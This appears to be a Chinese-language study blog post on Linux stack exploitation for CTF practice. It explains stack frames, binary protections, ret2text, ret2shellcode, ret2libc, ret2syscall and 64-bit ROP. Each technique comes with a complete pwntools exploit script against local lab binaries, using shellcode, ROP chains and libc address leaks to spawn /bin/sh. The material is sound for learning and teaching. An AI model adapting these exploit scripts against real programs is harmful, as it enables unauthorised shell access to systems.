（4）func函数的局部变量和参数 func函数有自己内部的运作空间，即func_ebp到func_esp 局部变量在编译之后会被表示为与ebp 不同的距离 v2被表示为ebp -18h，v3被表示为ebp -10h。 注意，这里的v2, v3和v4都是局部变量。参数的读取方式例子:第一个参数是ebp+8，第二个参数是ebp+12 因为调用约定，肯定有main_next和main_ebp在ebp的上方，故偏移是固定的，在返回地址main_next上面 然后，func函数返回。两个步骤：清除栈空间，返回到之前执行的指令（main_next）处。 (5)func函数返回步骤1:清除栈空间 每个函数清除栈空间时可以使用一条公用指令leave。 leave包含两个步骤： ①mov esp,ebp将栈顶设置为栈基，即将func_ebp到func_esp的内容全部出栈； ②pop ebp 将main_ebp的内容重新弹回ebp，使main函数的栈基址得到恢复 (6)func函数返回步骤2：返回之前执行的指令（main_next）处 每个函数返回时可以使用一条公用指令ret。ret包含一个步骤：将栈顶弹出到eip寄存器（即下一条指令的位置），达到恢复main函数执行顺序的 目的。 到这里，main函数的栈基址和下一条指令都得到了恢复，也就完成了整个func函数的调用。 Linux操作系统的保护 Arch:amd64-64-little： amd64即x86_64(CPU架构) 64即字长为64，返回地址在栈中占 8字节，32位是4字节） little表示小端序，如果是big则表示大端序。以数字0x12345678为例，小端序存储的是\\x78\\x56\\x34\\x12，大端序存储的是\\x12\\x34\\x56\\x78 RELRO：Partial RELRO: Partial RELRO和Full RELRO的区别可以简单理解为GOT写权限的区别，Partial RELRO相当于GOT可写，Full RELRO相当于GOT不可写。 NX：NX enabled: 如果开启了NX保护机制，那么w权限和x权限就是互斥的,即不存在既拥有写权限又拥有执行权限的段。这个保护机制是用来防止shellcode植入的。在gdb调试中，可以通过vmmap命令来查看每个段的权限。 PIE：No PIE（0x8048000） ret2text(覆盖返回地址)该函数内存在get漏洞 该函数泄露了后门函数 接着通过gets函数栈溢出将这个地址改为target，那么vulnfunc返回的时候，用ret指令取出栈顶的元素返回，就会返回到target这个函数 target函数中有system（”&#x2F;bin&#x2F;sh”）这个后门，类似于在Linux的终端直接调用&#x2F;bin&#x2F;sh。利用这种方式可以直接返回一个shell，进而得到目标主机的shell，拿到控制权。 找填充字节 直接从IDA中读出长度 s到vulnfunc的ebp的距离是108h，所以到main_next的距离是0x108+4 那个4是32位的ebp的空间 脚本1234567from pwn import *p = process(&quot;./ret2text&quot;)p.recvuntil(&quot;ret2text\\n&quot;)payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)p.sendline(payload)p.interactive() ret2shellcode（覆盖返回地址到Shellcode）Shellcode是机器码格式的恶意代码，指的是用于完成某个功能的汇编代码，常用的功能是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要求对应的二进制文件没有开启NX保护 printf(&quot;%p\\n&quot;, s)输出了S的缓冲区的位置 没有开启NX保护 所以可以向进程中写入一段Shellcode（利用w写权限），再执行这段Shellcode（利用x执行权限）。 脚本1234567891011from pwn import *context.arch = &quot;i386&quot;p = process(&quot;./ret2shellcode&quot;)#gdb.attach(p,&quot;b *0x08048593&quot;)p.recvuntil(b&quot;ret2shellcode\\n&quot;) # 修改为字节串target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) # 修改为字节串sc = asm(shellcraft.sh())payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) p.sendline(payload)p.interactive() context.arch = &quot;i386&quot;说明程序的架构，使用 asm() 函数将 shellcode (shellcraft.sh()) 汇编成机器码时，pwntools 需要知道目标架构是 32 位还是 64 位，以便生成正确的指令集。32 位和 64 位的指令是不同的。 target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) 接收知道读取到&#x2F;n，(输出的缓冲区的地址)，转化为十六进制整数，且drop = True方便地清理你接收到的数据。只提取某个模式（比如一个地址、一个数字或一个特定的字符串）而不包含用于分隔或终止的字符（如换行符、空格、冒号等） sc = asm(shellcraft.sh())生成启动/bin/sh的机器码 payload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target) 从右到左入栈，p32(target):覆盖返回地址，b’a’ * (0x108 + 4 - len(sc)):填充从sc结束位置到返回地址之间所有“无用”的栈空间。sc:当 sc位于缓冲区的起始位置。 context(arch &#x3D; ‘amd64’, os &#x3D; ‘linux’, log_level &#x3D; ‘debug’) 这种context的信息可以通过指令file+文件名 得到 输出示例： 1mrctf2020_shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, … 这里关键的信息： ELF → 说明是 Linux 64-bit → 说明是 64 位 x86-64 → 架构就是 amd64（pwntools 里写 amd64） 如果输出是： 1ELF 32-bit LSB executable, Intel 80386 那你就用： 1context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) 如果是： 1ELF 32-bit LSB executable, ARM 那你就用： 1context(arch=&#x27;arm&#x27;, os=&#x27;linux&#x27;) ropNX 保护 (No-Execute): 它的唯一目的是阻止你在数据区域（比如栈和堆）执行代码。你可以把栈和堆想象成一块“只写数据，不能跑程序”的区域。 允许什么？ 允许你在栈上写数据（比如填充字符串 AAAA，或者一些地址）。 允许你修改寄存器的值。 允许你覆盖返回地址。 阻止什么？ 阻止你把自己的汇编代码（我们称之为 Shellcode）放在栈上，然后让程序去执行它。 ret2libc1（单个函数的rop来链）第一步，先看保护 get溢出 system函数存在,但参数不是&#x2F;bin&#x2F;sh system函数存在,并且程序中心存在bin&#x2F;sh字符串 所以可以把bin&#x2F;sh作为参数传入system函数中构造后门函数 要构造一个后门函数，先调用system函数，然后按照调用流程，参数（bin&#x2F;sh字符串所在的位置）入栈，返回地址入栈 payload的形式是**[垃圾填充] + [system函数地址] + [system返回地址] + [binsh字符串地址]** 脚本12345678910111213from pwn import *context.arch = &quot;i386&quot; # 强烈建议加上这一行p = process(&quot;./ret2libc1&quot;)#gdb.attach(p,&quot;b *0x08048595&quot;) # 调试时启用#elf = ELF(&quot;./ret2libc1&quot;)#system = elf.plt[&quot;system&quot;]binsh = 0x0804A028 # 确保这个地址确实包含 &quot;/bin/sh&quot; 字符串p.recvuntil(b&quot;ret2libc1\\n&quot;) payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)p.sendline(payload)p.interactive() 找到system函数位置 elf = ELF(&quot;./ret2libc1&quot;) system = elf.plt[&quot;system&quot;]直接找到systemd的入口 注意 [system返回地址] 不能乱写，后门函数执行结束后会返回这个地址，错误的地址会引发崩溃 1.elf.plt[&quot;exit&quot;] (最常用，推荐)： 作用：让 system(&quot;/bin/sh&quot;) 执行完毕后，程序能够干净地调用 exit() 函数并退出。这是最推荐的做法，因为它确保了程序的正常终止。 优点：稳定、可靠，不会导致崩溃。 获取方式：elf.plt[&quot;exit&quot;] (pwntools 会自动解析)。 2.0x0 或其他无效地址 (导致崩溃)： 作用：如果你只关心 system(&quot;/bin/sh&quot;) 是否被执行，而不关心程序是否崩溃，那么可以随便填。 优点：最简单。 缺点：程序会崩溃，这在实际攻防中通常是不希望看到的。有时调试时为了快速验证 system 是否被调用，可能会暂时使用。 ret2libc2(两个函数的rop链) 该题没有bin&#x2F;sh字符串 所以我们要自己去通过get构造 (1)func函数通过栈溢出修改返回地址为gets_addr,传入get()的参数，b作为get函数底色参数，即其从终端读取的数据要存入的地方 （) （2）get函数被调用后会为自己开辟空间，执行时再次通过栈溢出填入system函数的地址和参数，最后调用system执行构造好的后门函数 分析之后得到应该构造如下形式的payload 其中get()函数和sys函数的参数都是bss段，get()用来把bin&#x2F;sh写入bss段，sys和它构成后门函数 get写入bss段的内容需要从终端读取，所以之后还要为其发送一个“bin&#x2F;sh” Payload的形式是p32（gets_addr）+p32（system_addr）+p32（gets_p1）+p32（system_p1）。 开启了NX保护，写和运行不能同时实现，所以改变该函数的参数位置，所以把 /bin/sh）写入一个可写的内存区域。.bss 段是一个非常理想的选择，因为它： 可写 通常位于固定的地址（特别是在 没有开启 ASLR 的情况下）； 在程序运行期间未初始化的数据都存储在这里。 找bss地址 1.readelf readelf -S ret2libc2 2.gdb调试 gdb ./ret2libc2 info files 显示了bss段的始末位置 3.脚本中直接得到 elf.bss() 脚本12345678910111213from pwn import *p = process(&quot;./ret2libc2&quot;)gdb.attach(p,&quot;b *0x08048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() gdb调试检查是否成功写入 c一下运行到下断点位置 这个时候第一个get已经实现，payload已经传入了 下一步会进入我们传进去的get中 get 和system函数都执行结束后 x/s 0x0804a040发现bss内存入了bin&#x2F;sh ret2libc2(多个函数的rop链)假设一个二进制文件里仅有read函数，read函数有三个参数（fd，addr和length） 这是按照两个rop链写出的payload填补形式 函数read因为拥有三个参数，所以相应地在栈上需要有三个块的空间。这时，system函数的第一个参数的位置就会和read函数的第二个参数的位置冲突，导致无法将system函数的第一个参数放置在栈上。不方便直接覆盖，因为read的参数限制比较多 所以这种情况就可以用pop&#x2F;ret进行 注意选取的基本原则：有几个参数就用几个pop指令，比如调用完gets函数之后，因为gets函数只有一个参数，所有可以将gets函数的返回地址改为0x0804862F，即只执行一个pop指令弹出参数之后就是ret指令；比如read函数有三个参数，那么就找0x0804862D这个位置，因为这个位置的指令是3个pop指令加上一个ret指令 如何寻找若干个pop指令跟着ret指令 ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot; (ROPgadget用于查找用来攻击的可执行代码片段，而readlf是程序的整体结构和内存布局) 脚本12345678910111213141516from pwn import *p = process(&quot;./ret2libc2&quot;)#gdb.attach(p,&quot;b *0x8048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()pop1_ret=0x804861bpayload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(pop1_ret)+p32(bss)payload+=p32(sys)+p32(pop1_ret)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() payload += p32(get) + p32(pop1_ret) + p32(bss): 盘子比喻 准备 ROP 链（堆叠盘子）： 你在内存的栈上，从下往上（也就是从低地址往高地址，因为栈是向下增长的），像堆叠盘子一样放了一系列地址。 假设你的 ROP 链片段是：A (get地址), B (pop ebp; ret地址), C (bss地址)。 栈上的盘子： 1234... (其他数据)[ C 盘子 (bss地址) ] &lt;-- 位于栈上较高位置[ B 盘子 (pop ebp; ret地址) ][ A 盘子 (get地址) ] &lt;-- 位于栈上较低位置，最先被程序“看到” 当程序返回时，会先“拿起”最上面的盘子（A）。 执行 get 函数（使用 A 盘子）： 程序因为栈溢出被劫持，它会跳到 get 函数的地址（A 盘）。 get 函数开始执行。它需要一个参数，也就是一个内存地址来存放它读取的数据。 get 函数会去“看”它自己返回地址上方的“盘子”，也就是 C 盘子 (bss地址)。 所以，C 盘子 (bss地址) 被 get 函数当作了它的参数，get 会将你通过 p.sendline(&quot;/bin/sh&quot;) 发送的数据写入到 C 盘子 所指示的内存区域（即 bss 段）。 get 函数执行完毕后，它需要“返回”。它会从栈上取回它的返回地址，也就是紧邻其下的 B 盘子 (pop ebp; ret地址)。 执行 pop ebp; ret gadget（使用 B 盘子）： 程序跳转到 B 盘子 (pop ebp; ret地址)。 现在，B 盘子 内部的指令开始执行： pop ebp： 这条指令会“拿起”栈顶的那个盘子。此时栈顶就是 C 盘子 (bss地址)。所以，C 盘子 (bss地址) 会被弹出并放入 ebp 寄存器。这个操作相当于把 C 盘子 从栈中拿走了。 ret： 这条指令会“拿起”栈中现在最上面的盘子（也就是 C 盘子 被拿走后暴露出的下一个盘子），并跳转到那个盘子上的地址。这个盘子就是你 ROP 链中的下一个函数地址（例如 sys 函数的地址）。 ret2syscall(底层系统调用静态) 开启了NX保护，但我们可以通过精心构造ROP链实现跳转，而不改变数据段的数值 除此之外没有上面有效的东西了,整个二进制文件中都没有system函数 所以自己为寄存器赋值以构造后门函数。且调用的int 0x80要放在最上面，调用时，从下往上开始执行，执行到调用指令时，该函数的参数必须准备好、 根据命令找到&#x2F;bin&#x2F;sh字符段 和int 0x80的调用命令以及需要的pop|ret命令 脚本12345678910111213141516171819from pwn import *p = process(&quot;./ret2syscall&quot;)#gdb.attach(p,&quot;b *0x080488ED&quot;)binsh=0x080ea068int_0x80=0x0806ce55pop_eax_ret = 0x080b8526pop_edx_ecx_ebx_ret = 0x0806f200eax = 11 # #define __NR_ execve 11ebx = binshecx = 0edx = 0payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(pop_eax_ret)+p32(eax)payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)payload+=p32(int_0x80)p.sendline(payload)p.interactive() 编译知识（1）静态编译。编译器在编译可执行文件的时候，会提取可执行文件需要调用的对应的动态链接库（.so）中的部分，并链接到可执行文件中 去，使可执行文件在运行的时候不依赖于动态链接库。 （2）动态编译。动态编译的可执行文件需要附带一个动态链接库，在执行时，需要调用其对应动态链接库中的命令。所以，其优点一方面是 缩小了可执行文件的大小，优点加快了编译速度，节省了系统资源。缺点一方面是哪怕很简单的程序，只要用到了链接库中的一两条命令，也要附带一个庞大的链接库；另一方面是如果其他计算机上没有安装对应的运行库，则经过动态编译的可执行文件就不能运行。 静态编译的优缺点与动态编译正好相反。 静态编译可以简单理解为将动态链接库中的代码拷贝出来放入对应的二进制文件里。 寄存器 在32位系统中，通过int 0x80指令触发系统调用。其中，EAX寄存器用于传递系统调用号，参数按顺序赋值给EBX、ECX、EDX、ESI、 EDI、EBP这6个寄存器。 在64位系统中，使用syscall指令来触发系统调用，同样使用EAX（RAX）寄存器传递系统调用号，RDI、RSI、RDX、RCX、R8、R9 这6个寄存器用来传递参数。 eg:read（0,buf,0x100） 32位时，eax&#x3D;3（#define__NR_read 3）;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;，设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的read（0,buf,0x100）。实际上，最后还会进入内核态执行。 64位时，rax&#x3D;0（#define__NR_read 0）;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100，设置完每个寄存器的值之后，再执行syscall指令，就会执行对应的read（0,buf,0x100）。 也是进入内核态执行。 如果想要完成Get shell 32位时，：eax&#x3D;11（#define__NR_execve 11）;ebx&#x3D;”&#x2F;bin&#x2F;sh”;ecx&#x3D;0;edx&#x3D;0;（NULL实际上就是0），设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的execve（”&#x2F;bin&#x2F;sh”,NULL,NULL）。 64位时，rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0; 在ida中红色为外部函数，白色为内部函数 静态编译的二进制文件全为内部函数 ret2libc3 脚本123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)#gdb.attach(p, &quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = 0x0804854E# 泄露 gets 地址p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)p.sendline(payload1)# 获取泄露地址leak_addr = u32(p.recv(4))# 用 LibcSearcher 查libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher 会根据你提供的函数名和地址，去匹配已知的 libc 数据库libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)是gets 函数在 libc 中的偏移（相对于 libc 基地址）system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#输出这个计算出的地址，便于检查# 第二次攻击p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got) 调用put函数泄露gets函数的实际地址，并且返回main函数，再次利用got漏洞 它内部使用的是 预定义符号名 ，比如： &quot;system&quot; &quot;gets&quot; &quot;printf&quot; &quot;str_bin_sh&quot; （就是你要找的 /bin/sh） 这些名字不是随便写的，是预先在 libc 数据库中定义好的符号名称。 脚本执行后会显示 这是因为用libc &#x3D; LibcSearcher(“gets”, leak_addr)进行选择适合的libc库，但不同版本的libc.so文件的变化不大，一个函数的地址约束不够严格，所以会显示多个libc版本供选择 解决多个libc.so版本供选择1.多个约束条件 哪些符号最稳妥 这是个很重要的问题： 为什么泄露 gets &#x2F; puts &#x2F; printf，不泄露 malloc &#x2F; exit &#x2F; system 呢？ 理由： 符号 稳妥程度 原因 puts 👍 几乎每个 libc 里都有，偏移独特 printf 👍 常见，偏移独特 gets 👍（但是 glibc2.28+ 被废弃了） read 👍 核心 IO，存在且稳定 write 👍 和 read 对应 system 👎 很常用，但是有的 libc 把它静态链接了或者位置很常见 exit 👎 偏移较小且常见，不建议用 __libc_start_main 👍 非常稳妥，通常不会冲突 因此建议你泄露的优先级是： 1puts &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets 理想状态下，你一次性泄露三个符号，比如： 123puts(gets@got);puts(puts@got);puts(printf@got); 然后用三个符号去查库，几乎100%唯一 但是 当程序编译时，只有真正被调用的外部库函数才会被链接，并且它们才会在 GOT 表里有条目。 而你的目标程序 ./ret2libc3 里： 12bash复制编辑gets, puts 有用到printf 没用到 所以：只能有两个约束条件 123css复制编辑elf.got[&quot;gets&quot;] ✅ 存在elf.got[&quot;puts&quot;] ✅ 存在elf.got[&quot;printf&quot;] ❌ 报错 脚本 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]#puts的got表main_addr = 0x0804854Ep.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#输出puts的实际位置p.sendline(payload1)leak_addr = u32(p.recv(4))leak_puts = u32(p.recv(4))#接收其位置libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc.add_condition(&quot;puts&quot;, leak_puts)#增加puts的位置作为约束条件libc_base = leak_addr - libc.dump(&quot;gets&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() 但是这个我尝试过对这个题目来说还是约束条件太少，但是由于这个题目调用函数比较少，所以可以作为约束的函数也比较少 1）GOT。GOT是全局偏移量表（Global Offset Table），用于存储外部函数在内存中的确切地址。GOT存储在数据段（Data Segment）内，可以在程序运行过程中被修改。 2）PLT是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之，程序会到PLT中寻找外部函数的地址。PLT存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改。 简单来讲，GOT是个数据表，存储的是外部函数的地址，具有读写权限（在FULL RELRO保护机制开启的时候，没有读写权限）；PLT是外部函数的入口表，存储的是每个外部函数的代码，具有执行权限。 尽管 libc 的加载地址是随机的（ASLR），但在libc不同的情况下 libc 内部所有函数相对于 libc 基地址的偏移量是固定不变的。这是 ret2libc 攻击的基础。 实际地址&#x3D;基址+偏移 当你写了一个程序使用了 libc 中的函数（如 printf），这个函数的具体地址在编译时是未知的，因为 libc 被加载的位置会因 ASLR（地址空间布局随机化）而变化。 函数名称 内容 PLT 提供跳转桩代码 GOT 存放实际函数地址 当你的程序调用 printf() 时，实际上调用的是 PLT 中的 printf@plt，PLT 再通过 GOT 查找真正的地址。 🔁 总结对比（重点来了！） 为什么可以用 system@plt？ 因为它是 libc 中system()函数的“入口大门”，进去以后就会自动跳过去，不用你自己去找路。 为什么不用 GOT？ 因为我们不是要读取地址，而是要调用函数。PLT 就像按钮，按下去就能运行函数，不需要先看地址。 什么时候必须用 GOT？ 当你在远程服务器上不知道 libc 版本和地址时，必须先通过 GOT 泄露一个函数地址，才能计算出其他函数的地址。 什么时候能直接用 PLT？ 当你在本地调试、libc 是固定的，而且程序没开 PIE（地址不随机化）的时候，就可以直接调用 PLT。 ret2libc3 可以用 ret2syscall 的方法来攻击，只需要找到特定的、固定的 ROP gadgets 和 int 0x80 指令。 选择 ret2libc 的方法，通常是因为 system() 函数提供的便捷性更高，虽然多了一步 libc 泄露的开销，但在大多数情况下，这种方法更“简单”且更“通用”。 在实际的 CTF 比赛中，攻击者会根据目标程序的具体情况（是否有易于利用的 int 0x80、是否有足够的 gadgets、是否有 &quot;/bin/sh&quot; 字符串等）来选择最简单、最可靠的攻击方法。 ret2libc3 之所以需要泄露 libc 地址，是因为它依赖于调用 libc 库中（而非程序自身）的封装函数（如 system()），而这些 libc 函数的地址会受到 ASLR (地址空间布局随机化) 的影响而随机化。ret2syscall 能够不泄露 libc 地址，是因为它依赖于程序自身或加载到固定地址的共享库中的 ROP gadget 和 int 0x80 指令，这些地址在没有 PIE (位置无关可执行文件) 的情况下是固定的。 ret2libc3_x6432位程序的payload都是在返回地址之后加上参数，而64位是在返回地址之前把参数放入寄存器中 64位程序和32位程序的ROP技术的不同点在于参数传递的方式不同。64位程序的前6个参数是rdi,rsi,rdx,rcx,r8,r9，后续参数才会放在栈上，所以64位程序的ROP和ret2syscall几乎是一样的，都是先控制寄存器，再跳转到对应的函数进行操作。 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3_x64&quot;)#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]rdi = 0x0000000000400783 # pop rdi ; retret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignmentp.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload1 = b&quot;a&quot; * (0x108)payload1 += p64(rdi) + p64(gets_got)payload1 +=p64(puts_plt)+p64(main_addr)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.address = libc_base#我感觉没什么用log.success(&quot;libc_base:&quot; + hex(libc_base))system = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)# ====== 修改开始：添加 GDB 动态下断点 ======gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;) # 在 system 地址处下断点# ====== 修改结束 ======p.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload2 = b&quot;a&quot; * (0x108)payload2 += p64(rdi) + p64(binsh)payload2 += p64(ret_gadget)payload2 += p64(system)p.sendline(payload2)p.interactive() 对于payload2由于考虑堆栈平衡，所以会有两个ret指令放在一起 payload2 +&#x3D; p64(rdi) + p64(binsh)payload2 +&#x3D; p64(ret_gadget) 堆栈平衡64位程序中，函数调用前，栈指针（rsp）必须是 16 字节对齐的 32位程序中，函数调用前后，栈指针 esp 的值应该保持不变（32位一般不考虑堆栈平衡） ✅ 一、静态分析：计算栈偏移 为了栈对齐（避免崩溃），你构造的 payload 中“除了填充部分”之外的内容（即 gadget 和参数）最好是一个偶数块（8 字节为一块） ✅ 二、动态调试：使用 GDB 查看 rsp 的值 对于这一题来说，在确定了libc.so库和libc基址之后，在system函数内在system处设置断点 之后运行这个脚本 这里就选择好libc版本了 之后动态调试查看 在刚进入这个函数的第一步，就已经处于不平衡的状态了 因为它在调用前是栈平衡，调用时会有push rsp 指令改变 查看栈顶的命令是 1info register rsp 注意对于构造的rop链 填充返回地址 填充的返回地址 效果 main() 让程序重新运行 main 函数（可重复利用） _start 重新开始整个程序 shellcode 地址 如果你想继续执行自己的代码 exit()或_exit() 安全退出程序 返回地址写0的时候偶尔会报错 返回地址处理🎯 2. 32 位 vs 64 位地址 项目 32 位 64 位 地址长度（位） 32 位 &#x3D; 4 字节 64 位 &#x3D; 8 字节 Python 里的表示 0xdeadbeef 0x7fffdeadbeef 打包函数 p32() p64() 解包函数 u32() u64() 32位接收 12leak = p.recv(4) # 32位泄露一般是4字节addr = u32(leak) # 转成 int 64位接收 12leak = p.recv(6) # 通常能收到6字节，有时候高两字节是0addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;)) # 补成8字节再解包 ljust(length, fillchar) 会将当前的字节串 leak 左对齐到指定的 length（这里是 8 字节），并使用 fillchar（这里是 b&#39;\\x00&#39;，即空字节）从右侧进行填充。 查看调用函数的传递的参数1payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr) 1. 初始状态（执行 ret 前） 假设此时栈布局如下（根据你的 payload）： python 1payload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh) 栈内存布局： text 123esp -&gt; 0x80484d0 （覆盖的返回地址，指向 system@plt）esp + 4 -&gt; 0x08048722 （伪造的返回地址）esp + 8 -&gt; 0x080482ea （参数 &quot;sh&quot; 的地址） 寄存器状态： eip：指向 GetFlag+90 的 ret 指令。 esp：指向栈顶 0x80484d0。 2. 执行 ret 指令 ret 等价于 pop eip，具体操作： 从栈顶弹出返回地址到 eip： eip = [esp] → eip = 0x80484d0（跳转到 system@plt）。 esp = esp + 4 → 栈指针上升 4 字节。 栈变化： text 12esp -&gt; 0x08048722 （原 esp + 4）esp + 4 -&gt; 0x080482ea （参数 &quot;sh&quot;） 3. 进入 system@plt 后的流程 (1) 首次调用 system@plt（GOT 未解析） system@plt 的代码： asm 1230x80484d0 &lt;system@plt&gt; jmp [0x804a024] ; 跳转到 GOT 表（首次指向下一行）0x80484d6 &lt;system@plt+6&gt; push 0x30 ; 重定位偏移0x80484db &lt;system@plt+11&gt; jmp 0x8048460 ; 跳转到动态链接器 jmp [0x804a024]： 首次调用时，GOT 表 0x804a024 中的值为 0x80484d6（即 system@plt+6），因此继续执行下一条指令。 push 0x30： esp = esp - 4 → 栈指针下降 4 字节。 [esp] = 0x30 → 将 0x30 压栈。 栈变化： text 123esp -&gt; 0x30 （新压入的值）esp + 4 -&gt; 0x08048722 （伪造的返回地址）esp + 8 -&gt; 0x080482ea （参数 &quot;sh&quot;） jmp 0x8048460： 跳转到动态链接器（_dl_runtime_resolve），解析 system 的真实地址并更新 GOT 表。 *(2) 动态链接器解析完成后 动态链接器会将 system 的真实地址写入 GOT 表 0x804a024。 后续跳转到 system 的真实代码。 4. 执行 system 函数时 (1) system 的调用约定（cdecl） 参数通过栈传递： call system 会隐式压入返回地址（但你的漏洞利用直接跳转到 system@plt，未通过 call）。 参数位于 esp + 4（因为 esp 指向返回地址）。 你的场景： 动态链接器解析完成后，直接跳转到 system 的真实代码。 此时栈布局： text 12esp -&gt; 0x08048722 （伪造的返回地址）esp + 4 -&gt; 0x080482ea （参数 &quot;sh&quot;） system 会从 esp + 4 读取参数（即 0x080482ea），执行 system(&quot;sh&quot;)。 (2) system 执行后的栈平衡 如果是正常 call system，调用者需通过 add esp, 4 清理参数。 但你的漏洞利用中： 通过 ret 跳转到 system@plt，未显式使用 call。 system 执行完毕后会返回到 0x08048722（伪造的地址）。 5. 全程 esp 变化总结 步骤 esp 变化 栈布局（栈顶向下） 执行 ret 前 esp → 0x80484d0 [0x80484d0, 0x08048722, 0x080482ea] 执行 ret esp += 4 → 0x08048722 [0x08048722, 0x080482ea] system@plt 中 push 0x30 esp -= 4 → 0x30 [0x30, 0x08048722, 0x080482ea] 动态链接器解析完成 esp 恢复为 0x08048722 [0x08048722, 0x080482ea] system 读取参数 从 esp + 4 读取 0x080482ea 参数 &quot;sh&quot; 被正确传递 6. 关键结论 ret 直接修改 eip 和 esp： 通过弹出返回地址实现控制流劫持，esp 会 +4。 system 的参数传递依赖栈布局： 确保 ret 后，esp + 4 指向参数地址（你的 payload 已满足）。 动态链接的额外栈操作： 首次调用 PLT 时会有 push 0x30，esp 会 -4，但最终不影响参数位置。 通过控制 ret 后的栈布局，你成功将 &quot;sh&quot; 传递给 system，最终获取 shell。","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"ida使用+动调","slug":"ida使用-动调","date":"2025-03-19T11:50:43.000Z","updated":"2025-07-14T07:30:59.888Z","comments":true,"path":"2025/03/19/ida使用-动调/","permalink":"http://example.com/2025/03/19/ida%E4%BD%BF%E7%94%A8-%E5%8A%A8%E8%B0%83/","excerpt":"","text":"ida动态调试断点一般打的都是软件断点 硬件断点的设法：打好断点后 